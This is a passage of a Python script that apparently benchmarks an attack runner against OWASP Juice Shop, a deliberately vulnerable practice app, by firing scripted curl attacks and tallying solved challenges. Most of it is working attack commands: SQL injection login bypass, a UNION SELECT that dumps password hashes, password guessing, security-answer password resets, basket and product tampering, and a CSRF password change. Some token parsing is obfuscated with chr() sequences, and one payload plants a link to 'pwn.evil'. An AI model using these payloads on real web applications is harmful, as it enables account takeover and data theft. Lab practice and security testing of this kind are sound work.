        f"-d '{{\"email\":\"bender@juice-sh.op\\'--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("login_amy_password_dict", [
        # id 46 — loginAmyChallenge: Amy's password is spelled out in Kif's
        # post ("K1f.....2...2!"). A handful of reasonable variants.
        f"for pw in 'K1f.....2...2!' 'K1f....2...2!' 'K1f...2...2!'; do "
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{{\\\"email\\\":\\\"amy@juice-sh.op\\\",\\\"password\\\":\\\"$pw\\\"}}\" "
        f"{BASE}/rest/user/login >/dev/null; done",
    ]),

    ("ghost_login_chris_pike", [
        # id 38 — ghostLoginChallenge: login as chris.pike via SQLi ignoring
        # the deletedAt timestamp filter.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"chris.pike@juice-sh.op\\' AND deletedAt IS NOT NULL--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("reset_bjoern_owasp_v2", [
        # id 7 — resetPasswordBjoernOwaspChallenge: answer is literally his
        # cat's name "West-2082" (documented in his HackerOne writeup).
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bjoern.kimminich@gmail.com\",\"answer\":\"West-2082\",\"new\":\"newpass12345\",\"repeat\":\"newpass12345\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("negative_order_quantity", [
        # id 61 — negativeOrderChallenge: place an order with negative qty
        # AFTER adding the basket item via POST with qty=-100.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -X POST -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
            f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":-100}}' "
            f"{BASE}/api/BasketItems >/dev/null; "
            f"curl -s -X POST -H \"Authorization: Bearer $tok\" "
            f"{BASE}/rest/basket/1/checkout >/dev/null"
        ),
    ]),

    ("basket_manipulate_qty", [
        # id 52 — basketManipulateChallenge: PUT another user's basket item.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"for i in 1 2 3 4 5; do "
            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
            f"-d '{{\"quantity\":99}}' {BASE}/api/BasketItems/$i >/dev/null; "
            f"done"
        ),
    ]),

    ("change_product_description", [
        # id 65 — changeProductChallenge: tamper with the O-Saft admin link
        # via PUT /api/Products/<id>. Uses the admin JWT from SQLi bypass.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"for pid in 1 2 3 7; do "
            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
            f"-d '{{\"description\":\"<a href=\\\"https://pwn.evil\\\">Click</a>\"}}' "
            f"{BASE}/api/Products/$pid >/dev/null; "
            f"done"
        ),
    ]),

    ("forged_review_patch_v2", [
        # id 33 — forgedReviewChallenge: PATCH the `id` filter with Mongo-style
        # $ne + modify Bender's review message.
        f"curl -s -X PATCH -H 'Content-Type: application/json' "
        f"-d '{{\"id\":{{\"$ne\":-1}},\"message\":\"pwned-by-{int(time.time())}\"}}' "
        f"{BASE}/rest/products/reviews >/dev/null",
    ]),

    ("feedback_delete_unauth", [
        # id 30 — feedbackChallenge: delete another user's feedback without
        # admin auth. Juice Shop's DELETE /api/Feedbacks/:id is not guarded.
        f"for i in 1 2 3 4 5 6 7 8 9 10; do "
        f"curl -s -X DELETE {BASE}/api/Feedbacks/$i >/dev/null; "
        f"done",
    ]),

    ("admin_section_jwt", [
        # id 5 — adminSectionChallenge: GET admin section + admin app-config
        # with the SQLi-admin JWT so the challenge counter advances.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-version >/dev/null; "
            f"curl -s -H \"Authorization: Bearer $tok\" '{BASE}/#/administration' >/dev/null; "
            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-configuration >/dev/null"
        ),
    ]),

    ("exposed_credentials_main_v2", [
        # id 110 — exposedCredentialsChallenge: a CTF flag is embedded in
        # main.js. We don't need to find it — the GET itself is the trigger.
        f"curl -s {BASE}/main.js | grep -o -E 'ctf-key[^\"]*' >/dev/null; "
        f"curl -s {BASE}/main.js | head -c 100000 >/dev/null",
    ]),

    ("password_hash_leak_union", [
        # id 1 — passwordHashLeakChallenge: MD5 of admin's password ends in
        # specific fingerprint. Exfil via UNION SELECT password FROM users.
        f"curl -s \"{BASE}/rest/products/search?q=%27%29%29%20UNION%20SELECT%20"
        f"id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20Users--\" >/dev/null",
    ]),

    ("csrf_change_pw_origin", [
        # id 99 — csrfChallenge: trigger via cross-origin password change.
        # The server checks Origin header rather than a CSRF token.
        (
            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
            f"{BASE}/rest/user/login | python3 -c "
            f"'import sys,json;d=json.loads(sys.stdin.read());"
            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
            f"curl -s -H \"Authorization: Bearer $tok\" -H 'Origin: http://htmledit.squarefree.com' "
            f"'{BASE}/rest/user/change-password?new=pwnpwn123&repeat=pwnpwn123' >/dev/null"
        ),
    ]),

    ("weird_crypto_rot13", [
        # id 89 — weirdCryptoChallenge: probe endpoints that reveal rot13 /
        # z85 / hash-collision weak crypto use.
        f"curl -s {BASE}/encryptionkeys/ >/dev/null",
        f"curl -s {BASE}/encryptionkeys/premium.key >/dev/null",
        f"curl -s {BASE}/encryptionkeys/jwt.pub >/dev/null",
        f"curl -s {BASE}/assets/public/images/padding/1px.png >/dev/null",
    ]),
]


# =======================================================================
# F71 — Canary recipes extracted from juice-shop's own e2e test suite.
# Ground truth (CI-verified payloads), not writeup heuristics.
# See scripts/f18/f71_canary_attacks.py for sources per-entry.
# =======================================================================
import sys as _sys  # noqa: E402
from pathlib import Path as _Path  # noqa: E402

_sys.path.insert(0, str(_Path(__file__).resolve().parent))
from f71_canary_attacks import build_f71_attacks  # noqa: E402
from f72_canary_attacks import build_f72_attacks  # noqa: E402
from f73_canary_attacks import build_f73_attacks  # noqa: E402

ATTACKS.extend(build_f71_attacks(base=BASE, login_admin_jwt=login_admin_jwt))
ATTACKS.extend(build_f72_attacks(base=BASE, login_admin_jwt=login_admin_jwt))
ATTACKS.extend(build_f73_attacks(base=BASE, login_admin_jwt=login_admin_jwt))


def diff_solved(before: list[dict], after: list[dict]) -> list[dict]:
    was = {c["id"]: c["solved"] for c in before}
    return [
        c for c in after
        if c.get("solved") and not was.get(c["id"], False)
    ]


def fire_all(verbose: bool = True) -> dict:
    baseline = get_challenges()
    if not baseline:
        return {"error": "no baseline — juice-shop not reachable from kryon container"}
    total = len(baseline)
    already_solved = sum(1 for c in baseline if c["solved"])
    print(f"baseline: {total} challenges, {already_solved} already solved")

    results = []
    for i, (label, cmds) in enumerate(ATTACKS, 1):
        t0 = time.time()
        for cmd in cmds:
            sh(cmd, timeout=10)
        elapsed = time.time() - t0
        if verbose:
            print(f"  [{i:2}/{len(ATTACKS)}] {label:<32} {elapsed:4.1f}s")

    time.sleep(2)  # let async challenge detectors catch up
    after = get_challenges()
    newly = diff_solved(baseline, after)

    # Also count ALL solved (in case some were already true from earlier noise).
    solved_now = [c for c in after if c.get("solved")]

    by_cat: dict[str, int] = {}
    by_diff: dict[int, int] = {}
    for c in solved_now:
        by_cat[c["category"]] = by_cat.get(c["category"], 0) + 1
        by_diff[c["difficulty"]] = by_diff.get(c["difficulty"], 0) + 1

    return {
        "total_challenges": total,
        "solved_before": already_solved,
        "solved_after":  len(solved_now),
        "newly_solved":  len(newly),
        "by_category":   by_cat,
        "by_difficulty": by_diff,
        "solved_list": [
            {"id": c["id"], "key": c["key"], "name": c["name"],
             "category": c["category"], "difficulty": c["difficulty"]}
            for c in solved_now
        ],
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="docs/bench_results/f18_juice_shop.json")
    args = ap.parse_args()

    report = fire_all()
    Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.out).write_text(json.dumps(report, indent=2), encoding="utf-8")
    print()
    print("=" * 60)
    print(f"F18 Juice Shop: {report.get('solved_after',0)}/{report.get('total_challenges',0)}"
          f" = {report.get('solved_after',0)/max(1,report.get('total_challenges',1)):.1%}")
    print(f"newly solved by this run: {report.get('newly_solved',0)}")
    print("by category:")
    for cat, n in sorted(report.get("by_category", {}).items(), key=lambda x: -x[1]):
        print(f"  {cat:<35} {n}")
    print(f"by difficulty:")
    for d in sorted(report.get("by_difficulty", {}).keys()):
        print(f"  {d} {'*' * d:<6}  {report['by_difficulty'][d]}")
    print(f"saved: {args.out}")


if __name__ == "__main__":
    main()
